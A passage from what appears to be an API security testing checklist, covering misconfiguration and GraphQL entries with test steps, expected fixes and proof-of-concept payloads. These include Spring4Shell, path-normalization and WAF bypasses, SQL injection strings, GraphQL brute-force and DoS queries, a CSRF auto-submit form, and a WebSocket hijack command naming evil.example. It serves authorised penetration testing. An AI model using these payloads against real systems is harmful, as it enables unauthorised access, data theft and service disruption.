PUT /api/search (should only allow GET)
DELETE /api/login
POST /api/logout
```

**Impact:** Misconfiguration exposes data or weakens security controls

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0506 — Spring4Shell via API Endpoint (CVE-2022-22965)
**Phase:** 12-Misconfig · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Target Spring MVC/WebFlux application on Java 9+<br>2. Send class.module.classLoader payload in request<br>3. Attempt RCE via log file manipulation

**Expected Result:** Spring Framework patched to 5.3.18+; WAF rules in place

**Payload / PoC Example:**

```
POST /api/endpoint
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20etc.
```

**Impact:** Misconfiguration exposes data or weakens security controls

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0507 — PostMessage Cross-Origin API Data Exfiltration
**Phase:** 12-Misconfig · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Find SPA using postMessage for cross-frame API calls<br>2. Set up attacker frame on allowed-parent domain<br>3. Intercept sensitive API data via postMessage

**Expected Result:** postMessage validates origin strictly; data not passed cross-origin unsafely

**Payload / PoC Example:**

```
window.parent.postMessage({action:'getToken'},'*')
EventListener captures token from victim frame
```

**Impact:** Misconfiguration exposes data or weakens security controls

**Tools:** Browser DevTools

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0508 — API Replay via Idempotency Key Manipulation
**Phase:** 12-Misconfig · **Category:** Security Misconfiguration · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Find endpoints using idempotency keys<br>2. Remove idempotency key and replay<br>3. Or reuse same key for different operation

**Expected Result:** Idempotency keys tied to operation and user; cannot be reused for different actions

**Payload / PoC Example:**

```
POST /api/payments  (remove Idempotency-Key header, replay)
Reuse same key for larger amount payment
```

**Impact:** Misconfiguration exposes data or weakens security controls

**Tools:** Burp Suite, Turbo Intruder

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0509 — API Gateway Path Confusion Bypass
**Phase:** 12-Misconfig · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GET Server config / response headers / defaults

**Test Steps:** 1. Map auth rules at gateway level<br>2. Try URL encoding, double encoding, case variation<br>3. Test path traversal, parameter overloading<br>4. Check if gateway and backend parse paths differently

**Expected Result:** Gateway and backend normalize paths identically; auth applied post-normalization

**Payload / PoC Example:**

```
# URL encoding bypass
GET /api/%61dmin/users    # 'a' URL encoded → /api/admin/users
GET /api/%2fadmin/users   # slash encoded
GET /api/admin%2fusers    # embedded slash

# Double encoding
GET /api/%2561dmin/users  # %25 = %, so %2561 = %61 = 'a'

# Path traversal to admin
GET /api/public/../admin/users
GET /api/v1/./admin/users
GET /api/v1/%2e%2e/admin/users

# Case variation (case-insensitive backends)
GET /API/Admin/Users
GET /Api/ADMIN/users

# Suffix/extension tricks
GET /api/admin/users.json
GET /api/admin/users;.css   # Spring/Nginx tricks
GET /api/admin/users%20      # Trailing space

# Overlong UTF-8
GET /api/%c0%afdmin/users   # Overlong encoding of 'a'

# Null byte path truncation
GET /api/admin/users%00.jpg  # Some servers stop at null byte
```

**Impact:** Misconfiguration exposes data or weakens security controls

**Tools:** Burp Suite, ffuf

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0510 — API gateway authz bypass via path normalization / double-encoding
**Phase:** 12-Misconfig · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Edge path-based auth rules (/admin, /internal) vs origin routing normalization

**Test Steps:** 1. Identify path-based access rules at the gateway<br>2. Try /api/..%2fadmin, //admin, /admin;/ , /admin%20, trailing dot/slash, mixed case, double-encoding<br>3. Check the origin routes the normalized path while the edge rule missed it<br>4. Reach the protected route

**Expected Result:** Edge and origin normalize the path identically before authorization

**Payload / PoC Example:**

```
GET /public/..%2f..%2fadmin/users   |   GET /admin%2e/   |   GET //internal/metrics
```

**Impact:** Path-normalization mismatch -&gt; reach gateway-protected admin/internal APIs

**Tools:** Burp Suite, ffuf

**References:** -&gt;[Path Traversal checklist](#/checklist/pathtraversal); Orange Tsai reverse-proxy/path-confusion research; OWASP API8; API8:2023 Security Misconfiguration

---

## API-0511 — WAF bypass for API payloads (content-type flip + JSON obfuscation)
**Phase:** 12-Misconfig · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** WAF in front of a JSON API — evasion of signature rules on the body

**Test Steps:** 1. Confirm a payload (SQLi/XSS/cmd) is WAF-blocked in JSON<br>2. Flip Content-Type (application/xml, text/plain, form) that the app still parses<br>3. Obfuscate JSON: \uXXXX unicode, array-wrap the value, duplicate/nested keys, whitespace/charset tricks<br>4. Confirm the payload reaches the sink

**Expected Result:** WAF normalizes the body per the real parser; app rejects unexpected content-types

**Payload / PoC Example:**

```
Content-Type: text/plain; {"q":"\u0027 OR 1=1--"}   |   {"q":["' OR 1=1--"]}   |   duplicate JSON keys
```

**Impact:** WAF evasion -&gt; deliver blocked injection payloads to API sinks

**Tools:** Burp Suite, custom scripts

**References:** -&gt;[WAF / Filter Bypass checklist](#/checklist/wafbypass); PayloadsAllTheThings (WAF/JSON evasion); OWASP API8; waf_filter_bypass catalog; API8:2023 Security Misconfiguration

---

## API-0512 — Depth attack
**Phase:** 13-GraphQL · **Category:** DoS · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST High-volume / large-payload requests

**Test Steps:** 1. Build deeply nested query (10-20 levels) via recursive types<br>2. Send and monitor latency / memory

**Expected Result:** Enforce depth and complexity limits

**Payload / PoC Example:**

```
{u{f{u{f{u{f{u{name}}}}}}}}
```

**Impact:** Server DoS

**Tools:** graphql-cop

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0513 — Alias attack
**Phase:** 13-GraphQL · **Category:** DoS · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** POST High-volume / large-payload requests

**Test Steps:** 1. Build query with 1000 aliases of same field<br>2. Brute via alias counts; bypass rate limits

**Expected Result:** Limit alias count and per-field cost

**Payload / PoC Example:**

```
a1:user(id:1){email} ... a1000:user(id:1000){email}
```

**Impact:** Brute-force amplification

**Tools:** Burp,graphql-cop

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0514 — Batch query attack
**Phase:** 13-GraphQL · **Category:** DoS · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** POST High-volume / large-payload requests

**Test Steps:** 1. Send array [{q1},{q2},...,{q1000}]<br>2. Each is a real op; rate limits often per-request

**Expected Result:** Restrict batch size

**Payload / PoC Example:**

```
[{"query":"..."},{"query":"..."}]
```

**Impact:** Bypass rate limits

**Tools:** Burp,graphql-cop

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0515 — Introspection enabled in production
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** POST GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Send full introspection query<br>2. Extract schema; parse types/fields<br>3. Identify sensitive operations

**Expected Result:** Disable introspection in prod

**Payload / PoC Example:**

```
{"query":"query{__schema{types{name fields{name}}}}"}
```

**Impact:** Schema discovery -&gt; targeted attacks

**Tools:** InQL,graphql-cop

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API9:2023 Improper Inventory Management

---

## API-0516 — GraphQL Over-fetching
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Read Resource — GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Send GraphQL query requesting all fields<br>2. Request nested objects deeply<br>3. Check what's returned

**Expected Result:** Should limit field access based on permissions

**Payload / PoC Example:**

```
query {users {password, email, ssn, cards}}
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** GraphQL Voyager, Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API3:2023 Broken Object Property Level Authorization

---

## API-0517 — GraphQL Introspection Enabled
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Read Resource — GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Send introspection query<br>2. Extract full schema<br>3. Identify sensitive queries

**Expected Result:** Should disable introspection in production

**Payload / PoC Example:**

```
query {__schema {types {name fields {name}}}}
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** GraphQL Voyager

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API9:2023 Improper Inventory Management

---

## API-0518 — GraphQL Query Depth Attack
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Send deeply nested query<br>2. Test recursive relationships<br>3. Monitor server resources

**Expected Result:** Should limit query depth (max 5-10 levels)

**Payload / PoC Example:**

```
query {users {posts {comments {replies {replies {replies}}}}}}
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** GraphQL Cop

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API4:2023 Unrestricted Resource Consumption

---

## API-0519 — GraphQL Batch Attack
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Send query with aliasing<br>2. Request same data 1000 times<br>3. Check if limited

**Expected Result:** Should limit query complexity and batching

**Payload / PoC Example:**

```
query {user1:user(id:1){name} user2:user(id:2){name} ... user1000:...}
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** GraphQL Cop

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API4:2023 Unrestricted Resource Consumption

---

## API-0520 — GraphQL Introspection Exposure
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Send introspection query<br>2. Extract schema<br>3. Identify sensitive operations

**Expected Result:** Should disable introspection in production

**Payload / PoC Example:**

```
{__schema{queryType{name}types{name fields{name}}}}
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** GraphQL Voyager

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API9:2023 Improper Inventory Management

---

## API-0521 — GraphQL Query Depth/Complexity Abuse
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Send deeply nested queries<br>2. Test recursive types<br>3. Monitor performance

**Expected Result:** Should enforce depth and complexity limits

**Payload / PoC Example:**

```
Deeply nested query (10+ levels)
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** GraphQL Cop

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API4:2023 Unrestricted Resource Consumption

---

## API-0522 — GraphQL Batching Abuse
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Send multiple operations<br>2. Bypass rate limits<br>3. Amplify attacks

**Expected Result:** Should restrict batch size and apply per-operation validation

**Payload / PoC Example:**

```
Batch 1000 mutations in single request
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** GraphQL Cop

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API4:2023 Unrestricted Resource Consumption

---

## API-0523 — GraphQL Alias Abuse
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Use many aliases<br>2. Execute same resolver multiple times<br>3. Check rate limiting

**Expected Result:** Should limit alias usage and apply per-field cost analysis

**Payload / PoC Example:**

```
query {a1:user(id:1){name} a2:user(id:1){name} ... a1000:user}
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** GraphQL Cop

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API4:2023 Unrestricted Resource Consumption

---

## API-0524 — GraphQL Over-Fetching/Nested Resolver Abuse
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Request deeply nested relationships<br>2. Trigger N+1 queries<br>3. Monitor database load

**Expected Result:** Should enforce query cost limits and optimize resolver chaining

**Payload / PoC Example:**

```
query {users{posts{comments{author{posts{comments}}}}}}}
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API4:2023 Unrestricted Resource Consumption

---

## API-0525 — GraphQL Resolver Injection
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Inject payloads in arguments<br>2. Test SQL/NoSQL injection<br>3. Check for command injection

**Expected Result:** Should validate resolver inputs strictly and use parameterized queries

**Payload / PoC Example:**

```
query {user(id:"1' OR '1'='1"){name}}
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** SQLMap

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0526 — GraphQL Subscription Abuse
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Open many subscriptions<br>2. Trigger subscription floods<br>3. Monitor resource usage

**Expected Result:** Should limit concurrent subscriptions

**Payload / PoC Example:**

```
Open 10000 concurrent subscriptions
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** Custom Script

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API4:2023 Unrestricted Resource Consumption

---

## API-0527 — GraphQL Alias Brute-Force via Search
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Search/Filter — GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Send GraphQL query using aliases to test multiple values<br>2. Brute-force OTPs, passwords in single request<br>3. Bypass rate limits via single aliased request

**Expected Result:** Per-alias rate limiting; query cost analysis enforced

**Payload / PoC Example:**

```
query { a1: login(u:"admin",p:"0001") a2: login(u:"admin",p:"0002") ... a1000: login(...) }
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** Burp Suite, GraphQL Cop

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API4:2023 Unrestricted Resource Consumption

---

## API-0528 — Insecure Object Reference in GraphQL Variables
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Execute GraphQL query with variable<br>2. Modify object ID in variable to another user's ID<br>3. Check if BOLA enforced in resolver

**Expected Result:** Every GraphQL resolver validates object ownership; not just route-level auth

**Payload / PoC Example:**

```
query GetOrder($id: ID!) { order(id: $id) { total items } }
variables: {"id":"ORDER-99999"}  (victim's order)
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** Burp Suite, InQL

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0529 — GraphQL Introspection in Production
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Send introspection query<br><br>2. Extract full schema<br><br>3. Identify sensitive queries and mutations<br><br>4. Map attack surface

**Expected Result:** Should disable introspection in production

**Payload / PoC Example:**

```
{__schema{types{name fields{name}}}}
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** GraphQL Voyager

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API9:2023 Improper Inventory Management

---

## API-0530 — GraphQL Fragment Abuse
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Create deeply nested fragments<br><br>2. Use fragment spreading extensively<br><br>3. Cause query complexity explosion<br><br>4. Monitor resource usage

**Expected Result:** Should limit fragment depth and complexity

**Payload / PoC Example:**

```
fragment A on User {...B} fragment B on User {...A}
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API4:2023 Unrestricted Resource Consumption

---

## API-0531 — GraphQL Directive Abuse
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Identify custom directives<br><br>2. Inject malicious directive arguments<br><br>3. Exploit directive processing<br><br>4. Achieve injection or DoS

**Expected Result:** Should validate directive arguments

**Payload / PoC Example:**

```
@include(if: ""malicious"")
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0532 — GraphQL Variable Injection
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Find query using variables<br><br>2. Inject unexpected variable types<br><br>3. Bypass type validation<br><br>4. Achieve injection

**Expected Result:** Should strictly validate variable types

**Payload / PoC Example:**

```
variables: {"id":"1 OR 1=1"}
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0533 — GraphQL Operation Name Enumeration
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** GraphQL endpoint (queries/mutations/introspection)

**Test Steps:** 1. Send requests with different operation names<br><br>2. Observe error messages<br><br>3. Enumerate valid operations<br><br>4. Discover hidden functionality

**Expected Result:** Should not leak operation names in errors

**Payload / PoC Example:**

```
operationName: ""AdminDeleteUser""
```

**Impact:** GraphQL introspection/batching abuse; DoS, BOLA, data exposure

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API9:2023 Improper Inventory Management

---

## API-0534 — GraphQL CSRF via GET / form-urlencoded mutation
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** GraphQL endpoint accepting GET or form-urlencoded body + cookie auth

**Test Steps:** 1. Confirm cookie-based auth (no CSRF token / custom header required)<br>2. Send a mutation via GET query param OR form-urlencoded POST (no preflight)<br>3. Host an auto-submit form; fire cross-site in a normal browser<br>4. Confirm the mutation executed as the victim

**Expected Result:** Mutations require POST+application/json, a custom header, and/or an anti-CSRF token

**Payload / PoC Example:**

```
<form action=/graphql method=POST><input name=query value='mutation{updateEmail(email:"me@x.test"){id}}'></form><script>forms[0].submit()</script>
```

**Impact:** GraphQL CSRF -&gt; forced state-changing mutation in victim session (email change -&gt; ATO)

**Tools:** Burp Suite, browser

**References:** -&gt;[CSRF checklist](#/checklist/csrf); GRAPHQL TESTING_GUIDE §14; PortSwigger CSRF; OWASP API8; API8:2023 Security Misconfiguration

---

## API-0535 — GraphQL subscriptions CSWSH / auth bypass (WebSocket)
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GraphQL subscription over WebSocket (graphql-transport-ws / graphql-ws)

**Test Steps:** 1. Connect wss://target/graphql with a FOREIGN Origin and NO token<br>2. Send connection_init then subscribe to a sensitive subscription<br>3. WIN-a: cookie-auth + no Origin check + cross-origin stream = CSWSH<br>4. WIN-b: sensitive subscription resolves with no/low auth = auth bypass

**Expected Result:** Handshake validates Origin AND requires a token in connection_init

**Payload / PoC Example:**

```
websocat -H='Origin: https://evil.example' wss://target/graphql --protocol graphql-transport-ws ; {"type":"subscribe","id":"1","payload":{"query":"subscription{messageAdded{text user{email}}}"}}
```

**Impact:** CSWSH / unauth subscription -&gt; cross-origin live data theft &amp; auth bypass

**Tools:** websocat, Burp Suite

**References:** -&gt;[WebSocket checklist](#/checklist/websocket); GRAPHQL TESTING_GUIDE §15.5; Christian Schneider CSWSH; OWASP API2; API2:2023 Broken Authentication

---

## API-0536 — GraphQL persisted-query / APQ allowlist bypass
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Automatic Persisted Queries (APQ) / allowlist gateway

**Test Steps:** 1. Observe APQ sha256Hash requests<br>2. Send a full arbitrary query with a mismatched/absent hash to trigger full-query fallback<br>3. Try registering new persisted queries<br>4. Reach fields the allowlist should block (introspection / admin)

**Expected Result:** APQ enforces a server-side allowlist; arbitrary queries rejected; introspection stays off

**Payload / PoC Example:**

```
{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"deadbeef"}},"query":"{__schema{types{name}}}"}
```

**Impact:** APQ/allowlist bypass -&gt; run blocked queries (introspection/admin) -&gt; schema &amp; data exposure

**Tools:** Burp Suite, curl

